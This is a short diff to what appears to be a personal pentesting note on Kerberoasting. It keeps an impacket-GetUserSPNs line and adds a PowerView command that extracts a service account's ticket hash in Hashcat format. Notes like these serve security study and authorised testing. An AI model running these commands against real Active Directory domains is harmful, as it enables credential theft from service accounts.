@@ -18,3 +18,9 @@ impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <DC_IP> -request
 
 
 we can also [[Kerberoasting via AS-REP Roasting]]
+
+---
+from windows we can get the hash of a service with `PowerView`
+```powershell
+Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat # get user hash (kerberoast)
+```
